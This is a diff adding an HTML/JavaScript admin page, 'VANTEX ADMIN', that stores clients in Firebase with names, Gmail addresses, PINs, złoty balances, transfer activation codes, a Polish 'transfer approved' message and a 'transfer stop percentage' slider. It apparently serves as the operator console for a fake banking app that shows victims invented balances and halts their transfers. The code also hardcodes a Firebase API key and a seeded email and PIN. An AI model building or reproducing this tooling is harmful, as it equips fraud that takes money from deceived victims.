@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VANTEX - Admin Firebase</title>
+<style>
+:root{--p:#6A0DAD;--bg:#f9fafb;--w:#fff;--b:#e5e7eb;--m:#6b7280;--r:#dc2626}
+*{box-sizing:border-box;font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
+body{margin:0;background:var(--bg);color:#111;font-size:14px}
+header{background:var(--p);color:#fff;padding:16px 20px;display:flex;align-items:center;gap:12px}
+.logo{width:38px;height:38px;background:#fff;color:var(--p);border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:800}
+.wrap{max-width:1100px;margin:0 auto;padding:18px}
+.card{background:var(--w);border:1px solid var(--b);border-radius:12px;padding:18px;margin-bottom:16px}
+.grid{display:grid;gap:10px;grid-template-columns:1fr 1fr}
+@media(max-width:700px){.grid{grid-template-columns:1fr}}
+label{font-size:12px;color:var(--m);display:block;margin-bottom:3px}
+input{width:100%;padding:9px 10px;border:1px solid var(--b);border-radius:7px;font-size:14px}
+.btn{background:var(--p);color:#fff;border:none;padding:9px 14px;border-radius:7px;cursor:pointer;font-weight:600}
+.btn2{background:#fff;color:var(--p);border:1px solid var(--p);padding:9px 14px;border-radius:7px;cursor:pointer}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th,td{padding:9px;border-bottom:1px solid var(--b);text-align:left}
+th{background:#fafafa;color:var(--m);font-weight:600}
+.badge{background:#f3e8ff;color:var(--p);padding:2px 6px;border-radius:4px;font-size:11px}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">V</div>
+  <div><div style="font-weight:700">VANTEX ADMIN</div><div style="font-size:11px;opacity:.85">Firebase • temps réel</div></div>
+</header>
+
+<div class="wrap">
+  <div class="card">
+    <h3 style="margin:0 0 12px">Créer / Modifier un client</h3>
+    <div class="grid">
+      <div><label>Nom complet</label><input id="nom" placeholder="KWIATKOWSKI PW"></div>
+      <div><label>Adresse Gmail</label><input id="email" type="email" placeholder="nom@gmail.com"></div>
+      <div><label>Code PIN (6 chiffres)</label><input id="pin" maxlength="6" placeholder="973018"></div>
+      <div><label>Montant initial (zł)</label><input id="montant" type="number" placeholder="10000"></div>
+      <div><label>Code d'activation virement</label><input id="code" placeholder="ACT123"></div>
+      <div><label>Message après activation</label><input id="msg" placeholder="Przelew zatwierdzony ✓"></div>
+    </div>
+    <div style="margin-top:10px">
+      <label>Pourcentage d'arrêt du virement : <b id="pv">100</b>%</label>
+      <input id="pct" type="range" min="1" max="100" value="100" style="width:100%">
+    </div>
+    <div style="margin-top:12px;display:flex;gap:8px">
+      <button class="btn" id="saveBtn">Enregistrer</button>
+      <button class="btn2" id="resetBtn">Réinitialiser</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3 style="margin:0 0 10px">Clients enregistrés</h3>
+    <div style="overflow:auto">
+      <table>
+        <thead><tr><th>Client</th><th>PIN</th><th>Montant</th><th>Code</th><th>%</th><th>Action</th></tr></thead>
+        <tbody id="tb"></tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+import {initializeApp} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-app.js";
+import {getDatabase, ref, push, onValue, remove, update} from "https://www.gstatic.com/firebasejs/12.4.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCU-KBtj7vx3OouofytlwIN3KPd1McNLEk",
+  authDomain: "vantex-admin-2026.firebaseapp.com",
+  databaseURL: "https://vantex-admin-2026-default-rtdb.europe-west1.firebasedatabase.app",
+  projectId: "vantex-admin-2026",
+  storageBucket: "vantex-admin-2026.firebasestorage.app",
+  messagingSenderId: "810884502320",
+  appId: "1:810884502320:web:b5ba7c2909ddf4ccf02ef5"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const clientsRef = ref(db, 'clients');
+
+let data = {};
+let editId = null;
+
+const $ = id => document.getElementById(id);
+$('pct').oninput = () => $('pv').textContent = $('pct').value;
+
+onValue(clientsRef, snap => {
+  data = snap.val() || {};
+  if(Object.keys(data).length === 0){
+    push(clientsRef, {
+      nom: 'KWIATKOWSKI PW',
+      email: 'avogodans61@gmail.com',
+      pin: '973018',
+      montant: 10000,
+      code: 'ACT123',
+      msg: 'Przelew zatwierdzony ✓',
+      pct: 100,
+      created: Date.now()
+    });
+  }
+  render();
+});
+
+function render(){
+  const rows = Object.entries(data).map(([id,v]) => `
+    <tr>
+      <td><b>${v.nom}</b><br><span style="color:#6b7280;font-size:11px">${v.email}</span></td>
+      <td><span class="badge">${v.pin}</span></td>
+      <td>${Number(v.montant).toLocaleString('pl-PL')} zł</td>
+      <td>${v.code}</td>
+      <td>${v.pct}%</td>
+      <td>
+        <button onclick="editClient('${id}')" style="padding:4px 8px;font-size:11px">Modifier</button>
+        <button onclick="delClient('${id}')" style="padding:4px 8px;font-size:11px;background:#fee;color:#900;border:1px solid #fcc;border-radius:4px;margin-left:4px">Supprimer</button>
+      </td>
+    </tr>`).join('');
+  $('tb').innerHTML = rows || '<tr><td colspan="6" style="text-align:center;color:#888;padding:20px">Aucun client</td></tr>';
+}
+
+$('saveBtn').onclick = () => {
+  const o = {
+    nom: $('nom').value.trim(),
+    email: $('email').value.trim().toLowerCase(),
+    pin: $('pin').value.trim(),
+    montant: Number($('montant').value)||0,
+    code: $('code').value.trim(),
+    msg: $('msg').value.trim(),
+    pct: Number($('pct').value),
+    updated: Date.now()
+  };
+  if(!o.nom ||!o.email ||!o.pin){ alert('Nom, Email et PIN obligatoires'); return; }
+  if(editId){ update(ref(db, 'clients/'+editId), o); } else { push(clientsRef, {...o, created: Date.now()}); }
+  resetForm();
+  alert('Client enregistré. Visible instantanément dans l\'application.');
+};
+
+$('resetBtn').onclick = resetForm;
+
+function resetForm(){
+  ['nom','email','pin','montant','code','msg'].forEach(i=>$(i).value='');
+  $('pct').value=100; $('pv').textContent='100'; editId=null;
+}
+
+window.editClient = (id) => {
+  const v = data[id]; editId = id;
+  $('nom').value=v.nom; $('email').value=v.email; $('pin').value=v.pin;
+  $('montant').value=v.montant; $('code').value=v.code; $('msg').value=v.msg;
+  $('pct').value=v.pct; $('pv').textContent=v.pct;
+  window.scrollTo({top:0,behavior:'smooth'});
+};
+
+window.delClient = (id) => {
+  if(confirm('Supprimer ce client? Il ne pourra plus se connecter.')){
+    remove(ref(db, 'clients/'+id));
+  }
+};
+</script>
+</body>
+</html>
